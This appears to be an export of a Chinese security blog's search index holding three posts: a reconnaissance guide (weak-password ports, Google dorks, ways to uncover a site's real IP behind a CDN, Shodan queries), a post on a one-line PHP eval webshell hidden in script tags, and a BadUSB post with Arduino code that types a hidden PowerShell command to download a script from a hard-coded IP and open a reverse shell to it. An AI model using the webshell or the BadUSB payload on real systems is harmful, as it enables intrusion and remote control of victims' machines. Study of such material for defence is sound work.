<h4 id="常见端口漏洞"><a href="#常见端口漏洞" class="headerlink" title="常见端口漏洞"></a>常见端口漏洞</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">21    FTP      匿名访问，弱口令</span><br><span class="line">22    SSH      弱口令登录</span><br><span class="line">23    Telnet   弱口令登录</span><br><span class="line">80    Web      常见Web漏洞或后台登录弱口令</span><br><span class="line">161   SNMP     public弱口令</span><br><span class="line">389   LDAP     匿名访问</span><br><span class="line">443   openssl  心脏滴血等</span><br><span class="line">445   smb      操作系统溢出漏洞</span><br><span class="line">873   rsync    匿名访问，弱口令</span><br><span class="line">1099  JAVArmi  命令执行</span><br><span class="line">1433  MsSQL    弱口令</span><br><span class="line">1521  Oracle   弱口令</span><br><span class="line">2601  Zebra    默认密码zebra</span><br><span class="line">3128  squid    匿名访问（可能内网漫游）</span><br><span class="line">3306  MySQL    弱口令</span><br><span class="line">3389  RDP      远程桌面弱口令</span><br><span class="line">4440  Rundeck          弱口令admin</span><br><span class="line">4848  GlassFish        弱口令admin/adminadmin</span><br><span class="line">5432  PostGreSQL       弱口令爆破</span><br><span class="line">6379  Redis            匿名访问</span><br><span class="line">7001,7002   Weblogic         弱口令爆破</span><br><span class="line">8080        Tomcat\Jboss     弱口令，Jboss匿名访问</span><br><span class="line">8080-8090   常见Web端口</span><br><span class="line">9043        WebSphere        弱口令爆破</span><br><span class="line">27017       MongoDB          未授权访问</span><br></pre></td></tr></table></figure>

<h3 id="7-敏感信息收集"><a href="#7-敏感信息收集" class="headerlink" title="7.敏感信息收集"></a>7.敏感信息收集</h3><h4 id="Google-Hack"><a href="#Google-Hack" class="headerlink" title="Google Hack"></a>Google Hack</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filetype: 搜索制定类型的文件，例如：filetype:doc.将返回所有以doc结尾的文件URL。</span><br><span class="line">intext: 把网页中的正文内容中的某个字符做为搜索条件。例如在google里输入:intext:Melon.将返回所有在网页正文部分包含”Melon”的网页。</span><br><span class="line">intitle: 搜索网页标题中是否有我们所要找的字符。allintitle:也同intitle类似。</span><br><span class="line">cache: 搜索google里关于某些内容的缓存,有时候往往能找到一些好东西。</span><br><span class="line">info: 查找指定站点的一些基本信息。</span><br><span class="line">inurl: 搜索我们指定的字符是否存在于URL中.例如输入:inurl:admin,将返回N个类似于这样的连接:http://xxx/admin,常用于查找通用漏洞、注入点、管理员登录的URL。</span><br><span class="line">allinurl:也同inurl类似,可指定多个字符</span><br><span class="line">linkurl: 例如搜索:linkurl:melons.top可以返回所有和melons.top做了链接的URL。</span><br><span class="line">site: 搜索指定域名,如site:melons.top.将返回所有和melons.top有关的URL。</span><br></pre></td></tr></table></figure>
<h4 id="查看响应头"><a href="#查看响应头" class="headerlink" title="查看响应头"></a>查看响应头</h4><p>F12查看系统，中间件版本。</p>
<h4 id="通过Github搜索获取敏感信息"><a href="#通过Github搜索获取敏感信息" class="headerlink" title="通过Github搜索获取敏感信息"></a>通过Github搜索获取敏感信息</h4><p>site:Github password</p>
<h3 id="8-真实IP"><a href="#8-真实IP" class="headerlink" title="8.真实IP"></a>8.真实IP</h3><p><strong>IP查询</strong><br><a href="https://www.ipip.net" target="_blank" rel="noopener">https://www.ipip.net</a>       查询该ip的具体信息<br><a href="https://site.ip138.com" target="_blank" rel="noopener">https://site.ip138.com</a>    ip反查域名/域名对应ip<br><a href="http://www.cip.cc/" target="_blank" rel="noopener">http://www.cip.cc/</a>          本机ip/其他ip简单信息</p>
<p><strong>判断是否为CDN</strong></p>
<h4 id="1、多地ping"><a href="#1、多地ping" class="headerlink" title="1、多地ping"></a>1、多地ping</h4><p>如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/DnsPing.png" alt="html">    </p>
<h4 id="2、nslookup"><a href="#2、nslookup" class="headerlink" title="2、nslookup"></a>2、nslookup</h4><p>使用nslookup查看域名解析对应的IP地址，如果解析到多个IP地址则说明使用了CDN~<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/nslookup.png" alt="html"><br>从上面可以看到解析到多个IP地址说明使用了CDN~</p>
<h4 id="3、使用CDN查询工具进行查看"><a href="#3、使用CDN查询工具进行查看" class="headerlink" title="3、使用CDN查询工具进行查看"></a>3、使用CDN查询工具进行查看</h4><p><a href="https://www.ipip.net/ip.html" target="_blank" rel="noopener">https://www.ipip.net/ip.html</a> //高精度IP查询<br><strong>绕CDN查真实IP地址</strong></p>
<h4 id="1、域名历史解析记录"><a href="#1、域名历史解析记录" class="headerlink" title="1、域名历史解析记录"></a>1、域名历史解析记录</h4><p>查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://dnsdb.io/zh-cn/</span><br><span class="line">https://x.threatbook.cn/</span><br><span class="line">http://toolbar.netcraft.com/site_report?url=</span><br><span class="line">http://viewdns.info/</span><br></pre></td></tr></table></figure>

<h4 id="2、查询子域名"><a href="#2、查询子域名" class="headerlink" title="2、查询子域名"></a>2、查询子域名</h4><p>很多站长也许只会对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过子域名查询对应的 IP 来辅助查找网站的真实IP。</p>
<h4 id="3、漏洞利用"><a href="#3、漏洞利用" class="headerlink" title="3、漏洞利用"></a>3、漏洞利用</h4><p>目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpinfo.png" alt="html"><br>XSS盲打，命令执行反弹shell，SSRF等。<br>无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</p>
<h4 id="4、网站邮件订阅查找"><a href="#4、网站邮件订阅查找" class="headerlink" title="4、网站邮件订阅查找"></a>4、网站邮件订阅查找</h4><p>让服务器主动连接我们告诉我们它的IP，不过使用的是合法的服务，如RSS邮件订阅，很多网站都自带sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。</p>
<h4 id="5、使用国外主机解析域名"><a href="#5、使用国外主机解析域名" class="headerlink" title="5、使用国外主机解析域名"></a>5、使用国外主机解析域名</h4><p>国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。</p>
<h4 id="6、网络空间引擎搜索法"><a href="#6、网络空间引擎搜索法" class="headerlink" title="6、网络空间引擎搜索法"></a>6、网络空间引擎搜索法</h4><p>常见的有以前的钟馗之眼，shodan，fofa搜索。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip。</p>
<h4 id="7、F5-LTM解码法"><a href="#7、F5-LTM解码法" class="headerlink" title="7、F5 LTM解码法"></a>7、F5 LTM解码法</h4><p>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</p>
<h4 id="8、利用网站返回的内容寻找真实原始IP"><a href="#8、利用网站返回的内容寻找真实原始IP" class="headerlink" title="8、利用网站返回的内容寻找真实原始IP"></a>8、利用网站返回的内容寻找真实原始IP</h4><p>如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。<br>浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</p>
<h4 id="9、利用SSL证书寻找真实原始IP"><a href="#9、利用SSL证书寻找真实原始IP" class="headerlink" title="9、利用SSL证书寻找真实原始IP"></a>9、利用SSL证书寻找真实原始IP</h4><p>以CloudFlare这款CDN加速器举例：假如你在 abc.com 上托管了一个服务，原始服务器IP是136.23.63.44。 而CloudFlare则会为你提供DDoS保护，Web应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。<br>为此，你的Web服务器就必须支持SSL并具有证书，此时CloudFlare与你的服务器之间的通信，就像你和CloudFlare之间的通信一样，会被加密（即没有灵活的SSL存在）。这看起来很安全，但问题是，当你在端口443(<a href="https://x.x.x.x:443" target="_blank" rel="noopener">https://x.x.x.x:443</a>) 上直接连接到IP时，SSL证书就会被暴露。<br>此时，如果攻击者扫描0.0.0.0/0，即整个互联网，他们就可以在端口443上获取在 aaa.com上的有效证书，进而获取提供给你的Web服务器IP。<br>目前Censys工具(<a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a>) 就能实现对整个互联网的扫描，Censys是一款用以搜索联网设备信息的新型搜索引擎，安全专家可以使用它来评估他们实现方案的安全性，而黑客则可以使用它作为前期侦查攻击目标、收集目标信息的强大利器。<br>Censys搜索引擎能够扫描整个互联网，Censys每天都会扫描IPv4地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。<br>而攻击者唯一需要做的就是把上面用文字描述的搜索词翻译成实际的搜索查询参数。<br>Censys证书查询搜索步骤如下：</p>
<h5 id="1、aaa-com-证书的搜索查询参数为：parsed-names：aaa-com"><a href="#1、aaa-com-证书的搜索查询参数为：parsed-names：aaa-com" class="headerlink" title="1、aaa.com 证书的搜索查询参数为：parsed.names：aaa.com"></a>1、aaa.com 证书的搜索查询参数为：parsed.names：aaa.com</h5><p>只显示有效证书的查询参数为：tags.raw：trusted<br>攻击者可以在Censys上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。</p>
<h5 id="2、组合后的搜索参数为：parsed-names-aaa-com-and-tags-raw-trusted"><a href="#2、组合后的搜索参数为：parsed-names-aaa-com-and-tags-raw-trusted" class="headerlink" title="2、组合后的搜索参数为：parsed.names: aaa.com and tags.raw: trusted"></a>2、组合后的搜索参数为：parsed.names: aaa.com and tags.raw: trusted</h5><h5 id="3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的”Explore”，打开包含多个工具的下拉菜单。What’s-using-this-certificate-gt-IPv4-Hosts；"><a href="#3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的”Explore”，打开包含多个工具的下拉菜单。What’s-using-this-certificate-gt-IPv4-Hosts；" class="headerlink" title="3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的”Explore”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; IPv4 Hosts；"></a>3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的”Explore”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; IPv4 Hosts；</h5><h4 id="10、通过shodan-favicon-ico获取真实IP"><a href="#10、通过shodan-favicon-ico获取真实IP" class="headerlink" title="10、通过shodan favicon.ico获取真实IP"></a>10、通过shodan favicon.ico获取真实IP</h4><p>在Shodan搜索中有一个关于网站icon图标的搜索语法，<strong>http.favicon.hash</strong>，我们可以使用这个语法来搜索出使用了同一icon图标的网站。(其实这种方法是看运气的，如果shodan中收录了目标网站则可以查到)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> mmh3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">response = requests.get(<span class="string">'https://www.baidu.com/favicon.ico'</span>)</span><br><span class="line">favicon = response.content.encode(<span class="string">'base64'</span>)</span><br><span class="line">hash = mmh3.hash(favicon)</span><br><span class="line"><span class="keyword">print</span> hash</span><br></pre></td></tr></table></figure>
<p>计算出的hash用 http.favicon.hash：hash 搜索</p>
<h3 id="9-shodan"><a href="#9-shodan" class="headerlink" title="9.shodan"></a>9.shodan</h3><p>shodan网站：<a href="http://www.shodan.io" target="_blank" rel="noopener">www.shodan.io</a><br>webcam //网络摄像头<br>搜索技巧：<br>   搜索指定端口：port:3389<br>   搜索指定IP地址：host:61.135.169.121<br>   搜索具体城市开放具体端口：city:hangzhou port:22<br>   搜索指定服务器：microsoft iis 6.0 / apache<br>kali：<br>   获取自身外部ip：myip<br>   查询指定IP：host xxxx (网页版可能不会显示)<br>   查看蜜罐保护：shodan honeyscore xxxx<br>python-shodan：<br>   初始化api key<br>   python-shodan search 方法：</p>
<ul>
<li>result = api.search(‘apache’)</li>
<li>print(result[‘total’])</li>
<li>查看api键值：<a href="https://developer.shodan.io/api" target="_blank" rel="noopener">https://developer.shodan.io/api</a></li>
<li>python-shodan查找ip：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">常用 Shodan 库函数</span><br><span class="line">shodan.Shodan(key) ：初始化连接API</span><br><span class="line">Shodan.count(query, facets=None)：返回查询结果数量</span><br><span class="line">Shodan.host(ip, history=False)：返回一个IP的详细信息</span><br><span class="line">Shodan.ports()：返回Shodan可查询的端口号</span><br><span class="line">Shodan.protocols()：返回Shodan可查询的协议</span><br><span class="line">Shodan.services()：返回Shodan可查询的服务</span><br><span class="line">Shodan.queries(page=1, sort=&apos;timestamp&apos;, order=&apos;desc&apos;)：查询其他用户分享的查询规则</span><br><span class="line">Shodan.scan(ips, force=False)：使用Shodan进行扫描，ips可以为字符或字典类型</span><br><span class="line">Shodan.search(query, page=1, limit=None, offset=None, facets=None, minify=True)：查询Shodan数据</span><br></pre></td></tr></table></figure>

<h3 id="10-旁站"><a href="#10-旁站" class="headerlink" title="10.旁站"></a>10.旁站</h3><p>看看网站有没有旁站<br><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">https://phpinfo.me/bing.php</a> //查询IP 查询旁站<br>对旁站进行信息收集 为下面的以后的漏洞挖掘做准备。</p>
<h3 id="11-判断系统版本"><a href="#11-判断系统版本" class="headerlink" title="11.判断系统版本"></a>11.判断系统版本</h3><p>最快速的就是利用Windows和Linux的对大小写敏感来判断<br>Windows对大小写不敏感 Linux对大小写敏感<br>利用TTL起始值判断操作系统,不同类型的操作系统都有默认的TTL值<br>TTL起始值:Windows xp(及在此版本之前的windows) 128 (广域网中TTL为65-128)<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Windows.png" alt="html"><br>Linux/Unix64(广域网中TTL为1-64)<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Linux.png" alt="html"><br>某些Unix:255，网关:255<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Gateway.png" alt="html"><br>使用nmap识别操作系统:nmap -O 192.168.0.1 #参数-O表示扫描操作系统信息,nmap基于签名,指纹,特征,CPE编号等方法去判断目标系统的信息 。<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/nmapO.png" alt="html"></p>
<h3 id="11-目标用的是哪种web服务器-具体版本号是多少"><a href="#11-目标用的是哪种web服务器-具体版本号是多少" class="headerlink" title="11.目标用的是哪种web服务器 具体版本号是多少"></a>11.目标用的是哪种web服务器 具体版本号是多少</h3><p>首先手工测试目标web服务器是否允许一些危险请求的方法：put move options<br>Apach 2.2.x/2.4.x<br>Nginx<br>IIS 6.x/7.x/8.x 尝试webdav写及远程执行<a href="https://github.com/edwardz246003/IIS_exploit" target="_blank" rel="noopener">CVE-2017-7269</a> 尝试短文件漏洞目录文件扫描<br>Tomcat 6.x/7.x/8.x 曾经出现的远程命令执行多 默认的管理面板 弱口令 部署war包<br>Jboss 未授权访问进入JBoss后台进行文件上传的漏洞，例如：CVE-2007-1036，CVE-2010-0738,CVE-2005-5750 Java反序列化进行远程代码执行的漏洞，例如：CVE-2015-7501，CVE-2017-7504，CVE-2017-12149，CVE-2013-4810。 还有一种 JBoss seam2的模板注入CVE-2010-1871漏洞。<br>Resin<br> 是否是集成环境 XAMPP LNMP</p>
<h3 id="12-目标站有没有WAF"><a href="#12-目标站有没有WAF" class="headerlink" title="12.目标站有没有WAF"></a>12.目标站有没有WAF</h3><p> 有没有WAF，是什么类型的WAF 加入敏感特征看看会不会拦截 FUZZ测试</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
        <tag>端口</tag>
      </tags>
  </entry>
  <entry>
    <title>JsWebshell</title>
    <url>/2019/12/11/JSshell/</url>
    <content><![CDATA[<p>在目标站有可写的html点时可以使用</p>
<a id="more"></a>

<h3 id="0x00-准备环境"><a href="#0x00-准备环境" class="headerlink" title="0x00 准备环境"></a>0x00 准备环境</h3><p>环境使用的是：PHP Version 5.6.27+Apach</p>
<h3 id="0x01-开始实验"><a href="#0x01-开始实验" class="headerlink" title="0x01 开始实验"></a>0x01 开始实验</h3><p>准备的代码为（这里用的虽然是js其实最后还是用了php）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language=php&gt;@eval($_POST[&apos;web&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>在这里我们先用纯Html做一次测试</p>
<p><img src="/images/JSshell/html.png" alt="html"></p>
<p>我们访问html页面发现并没有任何反应</p>
<p><img src="/images/JSshell/htmlphpinfo.png" alt="html"></p>
<p>我们再次访问php页面查看结果发现phpinfo出现在了页面上</p>
<p><img src="/images/JSshell/phpphpinfo.png" alt="html"></p>
<p>这里再测试一下可以利用的版本发现7以上的版本都不能顺利执行</p>
<p><img src="/images/JSshell/7.0.png" alt="html"></p>
<h3 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h3><p>利用条件已经很明确了，必须要php下确实存在的才可以被利用，这个方法可用完全是因为php支持html的原因，php7移除该方法，其实利用条件还是比较苛刻的。</p>
]]></content>
      <categories>
        <category>webshell</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>BadUsb</title>
    <url>/2019/04/19/BadUsb/</url>
    <content><![CDATA[<p>在2014年美国黑帽大会上，柏林SRLabs的安全研究人员JakobLell和独立安全研究人员Karsten Nohl展示了他们称为“BadUSB”(按照BadBIOS命名)的攻击方法，这种攻击方法让USB安全和几乎所有和USB相关的设备(包括具有USB端口的电脑)都陷入相当危险的状态。</p>
<a id="more"></a>

<h5 id="Windows系统自启动路径"><a href="#Windows系统自启动路径" class="headerlink" title="Windows系统自启动路径"></a>Windows系统自启动路径</h5><pre><code>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup</code></pre><h4 id="附自己的一些代码"><a href="#附自己的一些代码" class="headerlink" title="附自己的一些代码"></a>附自己的一些代码</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include&lt;Keyboard.h&gt; //包含键盘模块头文件</span></span><br><span class="line">void setup()&#123; //初始化</span><br><span class="line">Keyboard.begin();//开始键盘通信</span><br><span class="line">delay(<span class="number">1000</span>);//延时<span class="number">1000</span>毫秒，</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键 </span><br><span class="line">Keyboard.press(<span class="string">'r'</span>);//按下r键 CMD</span><br><span class="line">delay(<span class="number">500</span>); </span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);//松掉win键 </span><br><span class="line">Keyboard.release(<span class="string">'r'</span>);//松掉r键 </span><br><span class="line">Keyboard.println(<span class="string">"cmd"</span>);</span><br><span class="line">delay(<span class="number">500</span>); </span><br><span class="line">//Keyboard.println(<span class="string">"cmd.exe /T:01 /K mode CON: COLS=16 LINES=1"</span>); //缩小窗口</span><br><span class="line">//Keyboard.println(<span class="string">"<span class="variable">$clnt</span> = new-object System.Net.WebClient;<span class="variable">$url</span>= 'http://47.93.12.104/water.ps1';<span class="variable">$file</span> = 'D:\\melon.ps1';<span class="variable">$clnt</span>.DownloadFile(<span class="variable">$url</span>,<span class="variable">$file</span>);D:\\melon.ps1;"</span>);</span><br><span class="line">//.println(<span class="string">"powershell -w hidden while(1)&#123;IEX (New-Object Net.WebClient).DownloadString('D:\\melon.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 47.93.12.104 -port 9999&#125;"</span>);</span><br><span class="line">Keyboard.println(<span class="string">"powershell -w hidden while(1)&#123;IEX (New-Object Net.WebClient).DownloadString('http://47.93.12.104/water.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 47.93.12.104 -port 9999&#125;"</span>);</span><br><span class="line">Keyboard.press(KEY_RETURN);  //按下回车键</span><br><span class="line">Keyboard.release(KEY_RETURN); //释放回车键</span><br><span class="line">Keyboard.end();//结束键盘通讯 </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">void loop()//循环，这里的代码</span><br><span class="line">&#123; </span><br><span class="line">//循环体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>硬件安全</category>
      </categories>
      <tags>
        <tag>钓鱼</tag>
        <tag>USB</tag>
      </tags>
  </entry>
</search>
